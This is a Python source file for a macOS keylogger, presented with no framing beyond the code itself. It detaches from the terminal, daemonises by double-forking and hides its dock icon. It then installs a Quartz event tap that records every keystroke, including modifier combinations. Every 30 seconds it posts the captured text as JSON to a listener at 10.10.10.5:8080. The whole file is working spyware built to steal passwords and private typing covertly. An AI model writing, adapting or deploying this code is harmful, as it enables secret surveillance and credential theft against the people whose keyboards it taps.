import os
import sys
import json
import threading
import time

os.environ["LSBACKGROUND"] = "1"
try:
    import urllib.request
except ImportError:
    import urllib2 as urllib_request
else:
    urllib_request = urllib.request

LISTENER = "http://10.10.10.5:8080"
INTERVAL = 30

# redirect stdio to /dev/null so nothing writes to the terminal
sys.stdin = open(os.devnull, "r")
sys.stdout = open(os.devnull, "w")
sys.stderr = open(os.devnull, "w")

# ── daemonise if possible ──
if hasattr(os, "fork"):
    try:
        if os.fork():
            os._exit(0)
        os.setsid()
        if os.fork():
            os._exit(0)
    except OSError:
        pass

# ── Quartz event tap ──
import Quartz
from AppKit import NSApplication, NSApp, NSObject

# keycode → character (US layout, no modifiers, base plane only)
KEY_MAP = {
    0: "a", 1: "s", 2: "d", 3: "f", 4: "h", 5: "g", 6: "z", 7: "x",
    8: "c", 9: "v", 11: "b", 12: "q", 13: "w", 14: "e", 15: "r",
    16: "y", 17: "t", 18: "1", 19: "2", 20: "3", 21: "4", 22: "6",
    23: "5", 24: "=", 25: "9", 26: "7", 27: "-", 28: "8", 29: "0",
    30: "]", 31: "o", 32: "u", 33: "[", 34: "i", 35: "p",
    36: "\n", 37: "l", 38: "j", 39: "'", 40: "k", 41: ";", 42: "\\",
    43: ",", 44: "/", 45: "n", 46: "m", 47: ".", 48: "\t", 49: " ",
    50: "`", 51: "\b",
    65: "[.]",              # KP decimal
    67: "[*]", 69: "[+]",  # KP multiply, add
    75: "[/]", 76: "\n",   # KP divide, KP enter
    78: "[-]", 81: "[=]",  # KP minus, KP equals
    82: "0", 83: "1", 84: "2", 85: "3", 86: "4",  # KP 0-4
    87: "5", 88: "6", 89: "7", 91: "8", 92: "9",  # KP 5-9
    96: "[F5]", 97: "[F6]", 98: "[F7]", 99: "[F3]",
    100: "[F8]", 101: "[F9]", 102: "[F10]", 103: "[F11]",
    105: "[F13]", 106: "[F14]", 107: "[F15]", 109: "[F16]",
    111: "[F17]", 113: "[F2]", 114: "[HELP]",
    115: "[HOME]", 116: "[PGUP]", 117: "[DEL]", 118: "[F4]",
    119: "[END]", 120: "[F2]",
    121: "[PGDN]", 122: "[F1]", 123: "[LEFT]", 124: "[RIGHT]",
    125: "[DOWN]", 126: "[UP]",
    53: "[ESC]",
}

SHIFT_MAP = {
    "`": "~", "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")", "-": "_",
    "=": "+", "[": "{", "]": "}", "\\": "|", ";": ":", "'": '"',
    ",": "<", ".": ">", "/": "?",
}

shift_down = False
caps_on = False
ctrl_down = False
cmd_down = False
opt_down = False
buf = []


def key_down(vk):
    global shift_down, caps_on, ctrl_down, cmd_down, opt_down
    flags = {
        56: lambda: (True, "shift"),
        60: lambda: (True, "shift"),
        59: lambda: (True, "ctrl"),
        55: lambda: (True, "cmd"),
        58: lambda: (True, "opt"),
    }
    tracker = None
    for flag_vk, fn in flags.items():
        if vk == flag_vk:
            tracker = fn
            break
    if tracker:
        val, name = tracker()
        if name == "shift":
            shift_down = val
        elif name == "ctrl":
            ctrl_down = val
        elif name == "cmd":
            cmd_down = val
        elif name == "opt":
            opt_down = val
        return

    if vk == 57:  # Caps Lock — only toggles on down
        caps_on = not caps_on
        return

    base = KEY_MAP.get(vk)
    if base is None:
        return

    mods = []
    if ctrl_down:
        mods.append("CTRL")
    if cmd_down:
        mods.append("CMD")
    if opt_down:
        mods.append("OPT")
    if shift_down:
        mods.append("SHIFT")

    if mods:
        buf.append("[%s+%s]" % ("+".join(mods), base.strip("[]")))
        return

    ch = base
    if len(base) == 1 and "a" <= base <= "z":
        if (shift_down and not caps_on) or (caps_on and not shift_down):
            ch = ch.upper()
    elif len(base) == 1 and shift_down:
        ch = SHIFT_MAP.get(base, base)

    buf.append(ch)


def key_up(vk):
    global shift_down, ctrl_down, cmd_down, opt_down
    flags = {
        56: "shift", 60: "shift", 59: "ctrl", 55: "cmd", 58: "opt",
    }
    name = flags.get(vk)
    if name == "shift":
        shift_down = False
    elif name == "ctrl":
        ctrl_down = False
    elif name == "cmd":
        cmd_down = False
    elif name == "opt":
        opt_down = False


# ── CGEvent callback ──
def event_cb(proxy, e_type, event, refcon):
    vk = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
    if e_type == Quartz.kCGEventKeyDown:
        key_down(int(vk))
    elif e_type == Quartz.kCGEventKeyUp:
        key_up(int(vk))
    return event


# ── exfiltration thread ──
def exfil():
    global buf
    while True:
        time.sleep(INTERVAL)
        if not buf:
            continue
        snapshot = "".join(buf)
        buf = []
        try:
            data = json.dumps({"log": snapshot}).encode("utf-8")
            req = urllib_request.Request(
                LISTENER,
                data=data,
                headers={"Content-Type": "application/json"},
            )
            urllib_request.urlopen(req, timeout=5)
        except Exception:
            buf.insert(0, snapshot)


threading.Thread(target=exfil, daemon=True).start()

# ── install tap, run the event loop ──
mask = Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown) | Quartz.CGEventMaskBit(Quartz.kCGEventKeyUp)
tap = Quartz.CGEventTapCreate(
    Quartz.kCGSessionEventTap,
    Quartz.kCGHeadInsertEventTap,
    Quartz.kCGEventTapOptionDefault,
    mask,
    event_cb,
    None,
)

if not tap:
    sys.exit(1)

src = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
Quartz.CFRunLoopAddSource(
    Quartz.CFRunLoopGetCurrent(),
    src,
    Quartz.kCFRunLoopCommonModes,
)
Quartz.CGEventTapEnable(tap, True)

app = NSApplication.sharedApplication()
app.setActivationPolicy_(2)  # NSApplicationActivationPolicyAccessory = no dock icon
app.run()